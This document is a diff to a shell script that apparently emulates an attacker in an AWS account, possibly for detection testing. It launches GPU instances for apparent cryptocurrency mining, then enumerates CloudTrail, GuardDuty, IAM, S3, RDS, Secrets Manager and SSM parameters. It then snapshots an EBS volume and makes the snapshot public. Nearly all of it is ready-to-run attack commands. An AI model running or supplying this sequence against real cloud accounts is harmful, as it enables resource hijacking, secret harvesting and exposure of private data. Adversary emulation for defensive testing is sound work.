@@ -61,6 +61,35 @@ randomSleep
 echo "Attempting to spin up GPU instances"
 AMI_ID=$(aws ssm get-parameters-by-path --path /aws/service/ami-amazon-linux-latest --query "Parameters[].Name")
 aws ec2 run-instances \
-    --image-id $AMI_ID \
-    --instance-type g4ad.xlarge # https://medium.com/coinmonks/new-aws-instance-that-makes-eth-mining-profitable-1dd87183cce7
+    --image-id resolve:ssm:/aws/service/ami-amazon-linux-latest/amzn2-ami-hvm-x86_64-ebs \
+    --instance-type g4ad.xlarge \ # https://medium.com/coinmonks/new-aws-instance-that-makes-eth-mining-profitable-1dd87183cce7
     --count 5
+
+# That didn't work? What else can we do in the account...
+echo "Enumerating resources"
+aws ec2 describe-instances
+aws cloudtrail list-trails
+aws guardduty list-detectors
+randomSleep
+aws s3 ls
+aws iam list-account-aliases
+aws iam get-account-summary
+aws iam get-account-authorization-details
+aws rds describe-db-clusters
+aws rds describe-db-instances
+aws secretsmanager list-secrets
+aws ssm get-parameters-by-path --path / --recursive
+randomSleep
+
+echo "Listing EBS volumes and finding a juicy one"
+VOLUME_ID=$(aws ec2 describe-volumes | jq -r '.Volumes[] | select(.Size == 1) | .VolumeId')
+
+echo "Taking snapshot of $VOLUME_ID"
+SNAPSHOT_ID=$(aws ec2 create-snapshot --volume-id $VOLUME_ID | jq -r .SnapshotId)
+
+echo "Waiting for snapshot"
+aws ec2 wait snapshot-completed --filters Name=snapshot-id,Values=$SNAPSHOT_ID
+
+echo "Sharing snapshot publicly"
+randomSleep
+aws ec2 modify-snapshot-attribute --snapshot-id $SNAPSHOT_ID --attribute createVolumePermission --operation-type add --group-names all
